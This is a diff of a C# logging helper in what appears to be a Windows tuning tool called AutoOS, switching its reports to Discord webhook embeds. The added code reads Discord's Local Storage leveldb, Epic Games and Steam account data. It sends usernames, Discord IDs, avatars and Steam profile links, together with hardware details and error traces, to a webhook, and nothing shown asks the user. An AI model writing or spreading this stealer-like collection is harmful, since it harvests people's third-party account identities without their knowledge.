@@ -5,11 +5,14 @@ using AutoOS.Core.Helpers.GPU;
 using AutoOS.Core.Helpers.Monitor;
 using AutoOS.Core.Helpers.OS;
 using AutoOS.Core.Helpers.RAM;
+using AutoOS.Core.Helpers.Database;
+using AutoOS.Core.Helpers.Games;
+using AutoOS.Core.Helpers.Sound;
 using DevWinUI;
 using System.Net.Http.Headers;
 using System.Net.Security;
 using System.Security.Authentication;
-using System.Text.Json;
+using System.Text.Json.Nodes;
 using System.Text;
 using Windows.Storage;
 
@@ -38,12 +41,15 @@ public static partial class LogHelper
 
     public static async Task Log(IEnumerable<GpuInfo> selectedGpus = null, bool bios = false)
     {
-        string hardwareInfo = GetHardwareInfo(selectedGpus, false);
-        var (discordId, discordUsername) = GetDiscordUserInfo();
-        
+        var embed = GetOverview(selectedGpus, false);
+        var webhookPayload = new JsonObject
+        {
+            ["embeds"] = new JsonArray { embed }
+        };
+
         using var multipart = new MultipartFormDataContent
         {
-            { new StringContent($"<@{discordId}>\n{discordUsername}\n{hardwareInfo}\n{ProcessInfoHelper.Version}"), "content" }
+            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
         };
 
         if (bios)
@@ -64,26 +70,15 @@ public static partial class LogHelper
 
     public static async Task LogError(Exception ex, IEnumerable<GpuInfo> selectedGpus = null, string actionTitle = null)
     {
-        string hardwareInfo = GetHardwareInfo(selectedGpus, true);
-        var (discordId, discordUsername) = GetDiscordUserInfo();
-
-        StringBuilder sb = new StringBuilder();
-        sb.AppendLine($"<@{discordId}>");
-        sb.AppendLine(discordUsername);
-        sb.AppendLine(hardwareInfo);
-        if (!string.IsNullOrEmpty(actionTitle)) sb.AppendLine($"Action Title: {actionTitle}");
-        sb.AppendLine($"{ex.GetType().FullName}");
-        sb.AppendLine($"Message: {ex.Message}");
-        sb.AppendLine($"HResult: 0x{ex.HResult:X}");
-        sb.AppendLine($"Source: {ex.Source}");
-        sb.AppendLine("StackTrace:");
-        sb.AppendLine(ex.StackTrace);
-        if (ex.InnerException != null) sb.AppendLine($"\nInnerException:\n{ex.InnerException}");
-        sb.AppendLine($"{ProcessInfoHelper.Version}");
+        var embed = GetOverview(selectedGpus, true, ex, actionTitle);
+        var webhookPayload = new JsonObject
+        {
+            ["embeds"] = new JsonArray { embed }
+        };
 
         using var multipart = new MultipartFormDataContent
         {
-            { new StringContent(sb.ToString()), "content" }
+            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
         };
 
         if (!string.IsNullOrEmpty(LogConfig.Error))
@@ -94,12 +89,15 @@ public static partial class LogHelper
 
     public static async Task LogNetworkSettings(IEnumerable<GpuInfo> selectedGpus = null)
     {
-        string hardwareInfo = GetHardwareInfo(selectedGpus, false);
-        var (discordId, discordUsername) = GetDiscordUserInfo();
+        var embed = GetOverview(selectedGpus, false);
+        var webhookPayload = new JsonObject
+        {
+            ["embeds"] = new JsonArray { embed }
+        };
 
         using var multipart = new MultipartFormDataContent
         {
-            { new StringContent($"<@{discordId}>\n{discordUsername}\n{hardwareInfo}\n{ProcessInfoHelper.Version}"), "content" }
+            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
         };
 
         var devices = DeviceHelper.GetDevices(DeviceType.NIC);
@@ -161,10 +159,11 @@ public static partial class LogHelper
         }
     }
 
-    private static string GetHardwareInfo(IEnumerable<GpuInfo> selectedGpus = null, bool includeVendorId = false)
+    private static JsonObject GetOverview(IEnumerable<GpuInfo> selectedGpus = null, bool includeVendorId = false, Exception ex = null, string actionTitle = null)
     {
-        string installStart = localSettings.Values["Install_Start"]?.ToString() ?? "N/A";
-        string installEnd = localSettings.Values["Install_End"]?.ToString() ?? "N/A";
+        var discordAccounts = DiscordHelper.GetAccountData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"));
+        var epicAccounts = EpicGamesHelper.GetEpicGamesAccounts();
+        var steamAccounts = SteamHelper.GetSteamAccounts();
 
         string cpuName = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")?.ToString() ?? "";
         string manufacturer = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer", "")?.ToString() ?? "";
@@ -175,76 +174,171 @@ public static partial class LogHelper
         string ram = ramInfo != null ? $"{ramInfo.CapacityGB:N1} GB {ramInfo.DDRVersion} @ {ramInfo.MaxSpeedMHz} MHz" : "N/A";
 
         var currentGpus = GpuHelper.GetGPUs();
-        string gpus = string.Join(", ", currentGpus.Select(gpu => 
+        string gpus = string.Join("\n", currentGpus.Select(gpu =>
         {
             bool install = selectedGpus?.FirstOrDefault(x => x.PnPDeviceId == gpu.PnPDeviceId)?.Install ?? true;
             return $"{gpu.DeviceName} (DeviceId: {gpu.DeviceId}, Install: {install}, {gpu.CurrentVersion})";
         }));
 
-        string monitors = string.Join(", ", MonitorHelper.GetMonitors().Select(m => $"{m.DeviceName} ({m.Resolution.Width}x{m.Resolution.Height} @ {m.RefreshRate} Hz)"));
+        string monitors = string.Join("\n", MonitorHelper.GetMonitors().Select(m => $"{m.DeviceName} ({m.Resolution.Width}x{m.Resolution.Height} @ {m.RefreshRate} Hz)"));
 
         var nicsList = DeviceHelper.GetDevices(DeviceType.NIC);
-        string nics = nicsList.Count > 0 ? string.Join("\n", nicsList.Select(n => 
+        string nics = nicsList.Count > 0 ? string.Join("\n", nicsList.Select(n =>
         {
             string vendorPart = includeVendorId ? $", VendorId: {n.VendorId}" : "";
             return $"{n.FriendlyName} (DeviceId: {n.DeviceId}{vendorPart}, Current Version: {n.DriverType} {n.CurrentVersion}, Connected: {n.IsActive})";
         })) : "N/A";
 
-        string osVersionString = OSHelper.GetWindowsVersionString();
+        var audioParts = new List<string>();
 
-        return $"{motherboard}\n{cpuName}\n{ram}\n{gpus}\n{monitors}\n{nics}\n{osVersionString}\nInstall start: {installStart}\nInstall end: {installEnd}";
-    }
-
-    private static (string Id, string Username) GetDiscordUserInfo()
-    {
-        string discordId = "Failed to get Discord account id";
-        string discordUsername = "Failed to get Discord username";
-
-        string discordJsonPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "sentry", "scope_v3.json");
-        if (File.Exists(discordJsonPath))
+        var outputDevice = SoundHelper.GetDefaultAudioDeviceInfo(Windows.Win32.Media.Audio.EDataFlow.eRender);
+        if (outputDevice != null)
         {
-            try
-            {
-                string jsonText = File.ReadAllText(discordJsonPath);
-                using JsonDocument doc = JsonDocument.Parse(jsonText);
+            var outputDetails = SoundHelper.GetAudioDetails(outputDevice);
+            var outputBuffers = SoundHelper.GetBufferSizes(outputDevice);
+            var currentBuffer = outputBuffers.FirstOrDefault(buffer => buffer.IsCurrent);
 
-                if (doc.RootElement.TryGetProperty("scope", out var scope) &&
-                    scope.TryGetProperty("user", out var user))
-                {
-                    discordId = user.GetProperty("id").GetString() ?? discordId;
-                    discordUsername = user.GetProperty("username").GetString() ?? discordUsername;
-                }
-            }
-            catch { }
+            string outputFormat = $"{outputDetails.CurrentChannels} channels, {outputDetails.CurrentBitDepth} bit, {outputDetails.CurrentSampleRate} Hz";
+            string outputBuffer = currentBuffer != null ? $"{currentBuffer.Frames} samples" : "N/A";
+            audioParts.Add($"{outputDevice.FriendlyName} ({outputFormat}, {outputBuffer})");
         }
 
-        if (discordId == "Failed to get Discord account id")
+        var inputDevice = SoundHelper.GetDefaultAudioDeviceInfo(Windows.Win32.Media.Audio.EDataFlow.eCapture);
+        if (inputDevice != null)
         {
-            string discordLogPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "logs", "renderer_js.log");
+            var inputDetails = SoundHelper.GetAudioDetails(inputDevice);
+            var inputBuffers = SoundHelper.GetBufferSizes(inputDevice);
+            var currentBuffer = inputBuffers.FirstOrDefault(buffer => buffer.IsCurrent);
 
-            if (File.Exists(discordLogPath))
-            {
-                try
-                {
-                    using var fs = new FileStream(discordLogPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
-                    using var reader = new StreamReader(fs);
-                    string line;
-                    while ((line = reader.ReadLine()) != null)
-                    {
-                        if (line.Contains("[DatabaseManager] removing database (user: "))
-                        {
-                            int startIndex = line.IndexOf("user: ") + 6;
-                            int endIndex = line.IndexOf(",", startIndex);
-                            if (startIndex != -1 && endIndex != -1)
-                            {
-                                discordId = line.Substring(startIndex, endIndex - startIndex);
-                            }
-                        }
-                    }
-                }
-                catch { }
-            }
+            string inputFormat = $"{inputDetails.CurrentChannels} channels, {inputDetails.CurrentBitDepth} bit, {inputDetails.CurrentSampleRate} Hz";
+            string inputBuffer = currentBuffer != null ? $"{currentBuffer.Frames} samples" : "N/A";
+            audioParts.Add($"{inputDevice.FriendlyName} ({inputFormat}, {inputBuffer})");
         }
-        return (discordId, discordUsername);
+
+        string audioInfo = audioParts.Count > 0 ? string.Join("\n", audioParts) : "N/A";
+
+        var embed = new JsonObject
+        {
+            ["color"] = ex != null ? 4466470 : 3751195,
+            ["fields"] = new JsonArray
+            {
+                new JsonObject
+                {
+                    ["name"] = "Discord",
+                    ["value"] = discordAccounts != null && discordAccounts.Count > 0 ? string.Join("\n", discordAccounts.Select(a => $"{a.Username} <@{a.UserId}>{(a.IsActive ? " [Active]" : "")}")) : "N/A",
+                    ["inline"] = true
+                },
+                new JsonObject
+                {
+                    ["name"] = "Epic Games",
+                    ["value"] = epicAccounts != null && epicAccounts.Count > 0 ? string.Join("\n", epicAccounts.Select(a => $"{a.DisplayName}{(a.IsActive ? " [Active]" : "")}")) : "N/A",
+                    ["inline"] = true
+                },
+                new JsonObject
+                {
+                    ["name"] = "Steam",
+                    ["value"] = steamAccounts != null && steamAccounts.Count > 0 ? string.Join("\n", steamAccounts.Select(a => $"[{a.AccountName}](https://steamcommunity.com/profiles/{a.Steam64Id}){(a.AllowAutoLogin ? " [Active]" : "")}")) : "N/A",
+                    ["inline"] = true
+                },
+                new JsonObject
+                {
+                    ["name"] = "Motherboard",
+                    ["value"] = motherboard,
+                    ["inline"] = false
+                },
+                new JsonObject
+                {
+                    ["name"] = "CPU",
+                    ["value"] = cpuName,
+                    ["inline"] = false
+                },
+                new JsonObject
+                {
+                    ["name"] = "RAM",
+                    ["value"] = ram,
+                    ["inline"] = false
+                },
+                new JsonObject
+                {
+                    ["name"] = "GPUs",
+                    ["value"] = gpus,
+                    ["inline"] = false
+                },
+                new JsonObject
+                {
+                    ["name"] = "Displays",
+                    ["value"] = monitors,
+                    ["inline"] = false
+                },
+                new JsonObject
+                {
+                    ["name"] = "NICs",
+                    ["value"] = nics,
+                    ["inline"] = false
+                },
+                new JsonObject
+                {
+                    ["name"] = "Audio Devices",
+                    ["value"] = audioInfo,
+                    ["inline"] = false
+                },
+                new JsonObject
+                {
+                    ["name"] = "OS Build",
+                    ["value"] = OSHelper.GetWindowsVersionString(),
+                    ["inline"] = true
+                },
+                new JsonObject
+                {
+                    ["name"] = "Installation Details",
+                    ["value"] = $"Start: {localSettings.Values["Install_Start"]?.ToString() ?? "N/A"}\nEnd: {localSettings.Values["Install_End"]?.ToString() ?? "N/A"}\nVersion: {localSettings.Values["Install_Version"]?.ToString() ?? "N/A"}\nBuild: {localSettings.Values["Install_Build"]?.ToString() ?? "N/A"}",
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = new JsonObject
+            {
+                ["text"] = $"AutoOS {ProcessInfoHelper.Version}"
+            }
+        };
+
+        if (discordAccounts?.FirstOrDefault(active => active.IsActive) is var activeDiscordAccount)
+        {
+            embed["author"] = new JsonObject
+            {
+                ["name"] = activeDiscordAccount.Username,
+                ["icon_url"] = $"https://cdn.discordapp.com/avatars/{activeDiscordAccount.UserId}/{activeDiscordAccount.Avatar}.webp?size=64",
+                ["url"] = $"https://discord.com/users/{activeDiscordAccount.UserId}"
+            };
+        }
+
+        if (ex != null)
+        {
+            var errorSb = new StringBuilder();
+            errorSb.AppendLine($"{ex.GetType().FullName}");
+            errorSb.AppendLine($"Message: {ex.Message}");
+            errorSb.AppendLine($"HResult: 0x{ex.HResult:X}");
+            errorSb.AppendLine($"Source: {ex.Source}");
+            errorSb.AppendLine(ex.StackTrace);
+            if (ex.InnerException != null)
+            {
+                errorSb.AppendLine("**InnerException:**");
+                errorSb.AppendLine(ex.InnerException.ToString());
+            }
+            if (!string.IsNullOrEmpty(actionTitle))
+            {
+                errorSb.AppendLine($"**Action Title:** {actionTitle}");
+            }
+
+            var errorField = new JsonObject
+            {
+                ["name"] = "Error Details",
+                ["value"] = errorSb.ToString(),
+                ["inline"] = false
+            };
+
+            ((JsonArray)embed["fields"]).Insert(10, errorField);
+        }
+
+        return embed;
     }
 }
